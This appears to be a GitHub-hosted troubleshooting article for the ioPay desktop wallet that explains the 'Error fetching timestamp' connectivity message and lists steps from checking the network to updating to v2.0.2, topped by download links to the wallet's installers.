![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# "Error Fetching Timestamp": When ioPay Wallet Cannot Reach the IoTeX Network

**"Error fetching timestamp" means the app could not reach an IoTeX node.** That is the whole of it: the wallet asked for the current block time - the reference it uses to date balances, history and staking positions - and got no answer.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

It is not a sign that your funds moved, that a transaction failed, or that your wallet was compromised. A connectivity error cannot spend, send or lose anything.

## What the timestamp request is for

Every screen in a wallet that shows a *time* is really showing a block. "Last updated 3 minutes ago", a transaction's date, an unstaking countdown - all of those are computed from the chain's current block time, fetched from a node.

So when that fetch fails, the app has two choices: show you a number with no reliable time attached, or tell you it could not fetch one. This build does the second. The error is the honest option, not a bug in itself.

The chain it is trying to reach is IoTeX mainnet, chain ID **4689** - the value that identifies the network, as opposed to the 4690 testnet.

## The ladder, cheapest first

**1. Is your internet actually up?** Sounds trivial; it is the most common cause. A captive portal, a hotel network, a VPN that has silently dropped, or a DNS resolver that cannot resolve the endpoint all produce this error and nothing else.

**2. Does turning the VPN off (or on) change it?** A VPN can route you somewhere the endpoint is blocked, or filter the connection in a way that breaks it. Try the other state before concluding anything.

**3. Is a firewall or proxy in the way?** Corporate networks and some security suites intercept outbound traffic. If the app works on a phone hotspot and fails on your office network, you have found it.

**4. Is the endpoint itself down?** Endpoints have outages. If the network is fine and other things work but the wallet cannot fetch, wait and retry - and if it persists over hours, it may be the client's endpoint rather than your connection.

**5. Are you on the current build?** The problems users reported were fixed in **v2.0.2, 19 November 2026**, and an older build may still point at an endpoint or use a request that has since changed. The app supports auto-update; if it has not offered one, install the current asset over the existing app. [Update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).

## What this error does not mean

**"Is my wallet compromised?"** No. This error is what a *failed read* looks like. A compromised wallet does not announce itself with a timestamp error; it looks completely normal while someone else signs transactions. If you are worried about compromise, the checks are different: whether you entered your phrase anywhere, whether you approved anything unusual, and whether your backup is intact.

**"Did my transaction fail?"** Not because of this. Check the transaction's own status - a send either reached the network or it did not, and that state is separate from whether the app can currently read the clock. [Stuck and pending transfers](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md).

**"Is the IoTeX chain down?"** One app failing to reach one endpoint is not evidence of that. If the chain were halted, every explorer and every venue would say so at once.

**"Is my balance gone?"** No. [Balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) covers what a stale or missing number actually means - and the short version is that the number lives on-chain, not in the app.

## If it clears and comes back

Intermittent fetch failures usually mean an unreliable path - a mobile connection, a VPN, a network that rate-limits. Note when it happens: if it is only on one network, it is the network. If it is everywhere and all day, it is worth updating and then reporting, because it is the client's side.

One practical note on reporting: this repository has no open or closed issues, so there is no public support thread to check whether others see the same thing. That is a real limitation of the project's surface, not a reason to assume the app is broken.

## The order to try, in one line

Network -> VPN state -> firewall/proxy -> wait out an endpoint outage -> update to v2.0.2. Then, if it still fails, report it rather than reinstalling - a reinstall does not change which endpoint the app talks to, and it does not touch your funds either way.

## Why the clock matters more than it sounds

It is tempting to treat a timestamp error as cosmetic - the balance still shows, the history is there. But every time-shaped thing in a staking wallet is computed from that same read, so a client that cannot fetch the clock cannot reliably tell you several things you may be relying on:

- **whether an unstaking period has finished**, because the countdown is arithmetic on block time;
- **how old a pending transaction is**, which is the difference between "the next block" and "this is stuck";
- **whether a reward claim landed recently** or is weeks old;
- **how stale the balance in front of you is** - any "last updated" note is the clock again.

So the error is not noise around the edges of the app. It is the app saying it cannot date anything, which is a precise and useful statement, and the reason the fix is worth doing before you make a decision that depends on timing.

## When only one screen fails

A partial fetch is possible: some screens can fill from data the app already has while the time request fails, which makes the wallet look half-working. That is not a contradiction - different requests, different failures. Treat any screen showing stale times beside fresh-looking numbers as unverified, and cross-check the address on an explorer before acting on what you see.


## Related

- [Balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) - the display side of the same connectivity problem.
- [How to send IOTX](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-send-iotx-from-iopay-wallet.md) - the normal transfer path, once the app connects.
- [Updating ioPay Wallet](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md) - the current release and why an old build misbehaves.
